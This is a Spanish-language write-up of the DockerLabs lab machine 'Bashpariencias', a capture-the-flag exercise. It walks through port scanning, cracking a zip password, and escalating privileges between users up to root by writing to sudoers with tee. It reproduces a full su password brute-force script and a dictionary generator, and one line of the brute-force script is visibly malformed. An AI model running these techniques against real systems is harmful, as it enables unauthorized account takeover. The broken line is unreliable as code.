---
title: Bashpariencias - DockerLabs
published: true
categories: DockerLabs
---

| OS    | Dificultad | Creator    |
| ----- | ---------- | ---------- |
| Linux | Medio      | Firstatack |

## Escaneo y Reconocimiento de puertos

Vamos a iniciar nuestro reconocimiento con un rápido escaneo de nmap.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0108d083-1317-4f6c-a803-1015232037ad)

`nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2`
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `-sC`: Utiliza los scripts de reconocimiento por defecto de Nmap.
- `-sV`: Detecta la versión del servicio en los puertos abiertos.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

Vemos que esta abierto el puerto 8899 `SSH` y el puerto 80 `HTTP`

## Enumeración Web
Si accedemos a la pagina web vemos lo siguiente 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/9ee65e73-bb29-4ebb-a03d-1a58250108c1)


Si investigamos muy a fondo la web vemos que en el apartado Form se esta exponiendo algo interesante.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/a57129f1-51ce-478d-8eef-30af881a88fe)

Parece ser que nos esta dando un nombre vamos a revisar el codigo fuente y filtrar por ese nombre. (Siempre hemos de revisar el codigo fuente de la pagina ya que nos puede mostrar información como en este caso que esta oculta)

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/c43e754b-8255-40bb-b933-3a728a5f7515)

Vaya tenemos una posible contraseña para el usuario rosa.

Vamos a conectarnos por ssh que recordemos que esta en el puerto 8899 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/683a3cc2-4a59-45e1-aa78-2360a8c4d89e)

Si vamos al directorio home vemos diferentes usuarios y un archivo txt, el archivo txt no tenemos permisos para verlo así que vamos al directorio de rosa

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/3a1f1b78-20fd-4efc-827e-e3f14e8cf5a8)

En el directorio de Rosa hay lo siguiente:

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/be0ea688-6ddf-41de-aafe-8fe78279e147)

Un directorio llamado -, vamos acceder

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/46a9e342-72ee-4e82-aaf5-af6b93bcc28b)

Nos encontramos con un txt y un zip vamos a leer el txt

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/e3524880-0923-4274-9fb1-92f32b0d5155)

Perfecto pues si intentamos extraer el zip tiene contraseña asi que vamos a intentar con john hacer fuerza burta a este zip de la siguiente forma.

```
- Nos descargamos el archivo a nestra maquina atacante con : python3 -m http.server 5000
- Desde nuestra maquina atacante hacemos un wget http://172.21.0.2/archivo
- Ahora vamos a extraer el hash del archivo zip con : zip2john archivo > hash
- Por ultimo vamos a craquear el hash con john --wordlist=/usr/share/wordlists/rockyou.txt hash
```


![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/bfd136d4-790a-4da3-9ecc-eced6ec86652)

Hemos obtenido la contraseña vamos a descomprimir el zip

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/b1efd844-9f38-4e8b-8cff-fe19f695b7c3)

Ya tenemos la contraseña del usuario juan:hackwhitbash


Ahora vamos a escalar al usuario Juan y si hacemos sudo -l vemos que tenemos los binarios tree y cat que los podemos ejecutar como el usuario carlos.


![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/2316f521-5fb5-4587-b080-80db9b4f202f)

Vamos a listar el directorio de carlos para ver si encontramos algo 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/4ee27d0d-2df9-4ac0-8c51-6e58dbcd2ff2)

Encontramos un archivo llamado .misecreto.txt vamos hacer uso del binario cat con el usuario carlos para poder acceder a ese archivo.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/4ef84a86-2475-41cb-bb1c-2601e7c9f4cb)

Lo que tendremos que hacer script que nos genere un diccionario para mas tarde hacer fuerza burta en local.

para el script del diccionario yo se lo he pedido a ChatGPT que me lo haga 

```
```bash  
#!/bin/bash  
  
# Definimos la palabra base  
palabra_base="chocolate"  
  
# Iteramos sobre cada letra del alfabeto en un orden diferente  
for letra1 in {a..z}; do  
   for letra2 in {a..z}; do  
       for letra3 in {a..z}; do  
           # Construimos la palabra utilizando un formato diferente  
           nueva_palabra="${letra1}${letra2}${letra3}${palabra_base}"  
           echo $nueva_palabra >> dict2.txt  
       done  
   done  
done
```

y el script para hacer fuerza bruta es el siguente que si no recuerdo mal es de el PinguinodeMario

```
#!/bin/bash  
  
# Función que se ejecutará en caso de que el usuario no proporcione 2 argumentos.  
mostrar_ayuda() {  
   echo -e "\e[1;33mUso: $0 USUARIO DICCIONARIO"  
   echo -e "\e[1;31mSe deben especificar tanto el nombre de usuario como el archivo de diccionario.\e[0m"  
   exit 1  
}  
  
# Para imprimir un sencillo banner en alguna parte del script.  
imprimir_banner() {  
   echo -e "\e[1;34m"  # Cambiar el texto a color azul brillante  
   echo "******************************"  
   echo "*     BruteForce SU         *"  
   echo "******************************"  
   echo -e "\e[0m"  # Restablecer los colores a los valores predeterminados  
}  
  
# Llamamos a esta función desde el trap finalizar SIGINT (En caso de que el usuario presione control + c para salir)  
finalizar() {  
   echo -e "\e[1;31m\nFinalizando el script\e[0m"  
   exit  
}  
  
trap finalizar SIGINT  
  
usuario=$1  
diccionario=$2  
  
# Variable especial $# para comprobar el número de parámetros introducido. En caso de no ser 2, se imprimen las instrucciones.  
if [[ $# != 2 | $ >  != 2 ]]; then  
   mostrar_ayuda  
fi  
  
# Imprimimos el banner al momento de realizar el ataque.  
imprimir_banner  
  
# Bucle while que lee línea a línea el contenido de la variable $diccionario, que a su vez esta variable recibe el diccionario como parámetro.  
while IFS= read -r password; do  
   echo "Probando contraseña: $password"  
   if timeout 0.1 bash -c "echo '$password' | su $usuario -c 'echo Hello'" > /dev/null 2>&1; then  
       clear  
       echo -e "\e[1;32mContraseña encontrada para el usuario $usuario: $password\e[0m"  
       break  
   fi  
done < "$diccionario"

```

Entonces con estas dos cosas en la maquina victima vamos hacer lo siguiente

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/1922dba9-0477-45d0-ab9a-a7d58b4ec480)

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/ccda5f03-ab4c-4a6d-85e9-167ed80bc720)

Ya tenemos la contraseña de carlos así que vamos a escalar a este usuario 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/1d1cccd8-336e-4c4b-bc47-c3141d64ec82)

Vemos que carlos puede ejecutar el binario tee como cualquier usuario.

*El comando tee en sistemas Unix y Linux es una herramienta de línea de comandos que se utiliza para leer desde la entrada estándar (stdin) y escribir simultáneamente a la salida estándar (stdout) y a un archivo. Esto significa que puedes usar tee para ver la salida de un comando mientras también guarda esa salida en un archivo.

Como podemos usar tee como root vamos añadir a carlos al archivo sudoers para que podamos escalar a root sin proporcionar contraseña 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/f52bd910-9457-43bc-b915-9c65a4bc5497)

Ya somos root
